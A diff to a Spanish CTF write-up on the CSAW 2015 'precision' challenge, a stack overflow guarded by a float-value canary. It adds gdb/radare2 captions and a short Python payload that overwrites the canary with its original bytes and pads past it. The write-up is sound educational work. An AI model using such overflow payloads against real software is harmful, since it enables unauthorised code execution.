@@ -29,7 +29,7 @@
           \_  (__   (__        
             "-._,)--._,)
 </code></pre>
-<p>Escrito por Alvaro M. aka <code><a href="https://twitter.com/naivenom">@naivenom</a></code>.</p>
+<p>Redactado por Alvaro M. aka <code><a href="https://twitter.com/naivenom">@naivenom</a></code>.</p>
 <h2 id="indice">Indice</h2>
 <h4 id="indice-exploiting">[Exploiting]</h4>
 <p><a href="#refs_uno">1. Smashing Stack sobreescribiendo EIP con una direccion de memoria controlada por nosotros + float value(canary) + shellcode (I)</a></p>
@@ -46,7 +46,7 @@ Seguidamente carga el float value en el stack <code>fstp qword [esp + 0x98]</cod
 <code>printf()</code>, <code>scanf()</code> y probablemente tengamos un Buffer Overflow (BoF de ahora en adelante) despues de la funcion <code>scanf()</code> porque no controlora o checkeara cuantos caracteres o "junk" le enviemos en nuestro payload. 
 Finalmente en el mismo bloque antes de llegar a un salto condicional y despues de ejecutar <code>scanf()</code> ejecuta la misma instruccion <code>fld qword [esp + 0x98]</code> realizando floating load donde previamente se escribio en el Stack y seguidamente ejecuta <code>fld qword [0x8048690]</code> siendo el original float value del calculo realizado en la FPU. Despues de estas dos instrucciones tan relevantes realiza <code>fucompi st(1)</code> comparando ambos valores. Por tanto esta comprobacion que se realiza cuando se ejecuta despues del prologo y antes del salto condicional es una especie de Stack Canary</p>
 <p>Cuando debugeamos el binario y nos encontramos en la direccion de memoria <code>0x080485a3</code> y queremos desensamblar la direccion que contiene el float original value aparece su contenido, sin embargo si desensamblamos la direccion de memoria del stack <code>[esp+0x98]</code> podemos observar que su contenido es justo los valores <code>0x41414141</code> ya que con el data o "junk" que hemos enviado sobreescribe el float value y el stack canary nos lo detectara.</p>
-<p>Seguidamente debemos saber donde esta localizada la direccion de memoria del float en el stack, y esta en los últimos 8 Bytes de <code>0xffda4c70</code>
+<p>Seguidamente debemos saber donde esta localizada la direccion de memoria del float en el stack, y esta en los últimos 8 Bytes de <code>0xffffd2b0</code>
 <pre><code>❯ Ejemplo_                                                                         
 Buffer:            AAAAAAAAAAAAAAAAAAAAAAAAAA + 0.245454 + EIP
 Smashing Float:    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA + MEMORY ADDRESS que queremos controlar
@@ -81,6 +81,7 @@ hit breakpoint at: 80485a3
 0xffa3da68  a531 5a47 5515 5040 0050 edf7 0050 edf7  .1ZGU.P@.P...P..
 
 </code></pre>
+<p>Informacion de los registros de la FPU y desensamblado de sus direcciones de memoria:</p>
 <pre><code>❯ gdb -q precision 
 Reading symbols from precision...(no debugging symbols found)...done.
 gdb-peda$ break *main
@@ -103,6 +104,7 @@ gdb-peda$ x/wx 0x8048690
 gdb-peda$ x/wx $esp+0x98
 0xffffd2b8:	0x475a31a5
 </code></pre>
+<p>Sobreescritura del float value:</p>
 <pre><code>❯ r2 -d precision  
 [0x0804851d]> db 0x080485a3
 [0x0804851d]> dc
@@ -116,6 +118,7 @@ hit breakpoint at: 80485a3
 0xfff92238  4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
 0xfff92248  4141 4141 4100 eef7 0040 f0f7 0000 0000  AAAAA....@......
 </code></pre>
+<p>En radare2 tenemos el valor del float en el offset <code>0xffda4c70</code>:<code>a531 5a47 5515 5040</code></p>
 <pre><code>❯ r2 -d precision 
 [0x0804851d]> db 0x08048543
 [0x0804851d]> dc
@@ -133,7 +136,18 @@ hit breakpoint at: 8048543
 0xffda4c60  0100 0000 244d daff 2c4d daff a591 d7f7  ....$M..,M......
 0xffda4c70  a029 f6f7 0000 0000 a531 5a47 5515 5040  .).......1ZGU.P@
 </code></pre>
-<h4>[Exploit]:</h4><p></p>
+<h4>[Exploit]:</h4><pre><code>import struct
+
+
+data = lambda data: struct.pack("I", data)
+junk = "AAAAAABBBBBCCCCCDDDEEFFGGHHIIJJKKLLMM"
+payload = ""
+payload += "A"*128
+payload += data(0x475a31a5)
+payload += data(0x40501555)
+payload += junk
+
+print payload</code></pre>
 <h4>[URL Reto]:</h4><p><a href="https://github.com/ctfs/write-ups-2015/blob/master/csaw-ctf-2015/pwn/precision-100/precision_a8f6f0590c177948fe06c76a1831e650">--Precision100 CSAW CTF 2015--</a></p>
 <p>[Continuara...]</p>
 
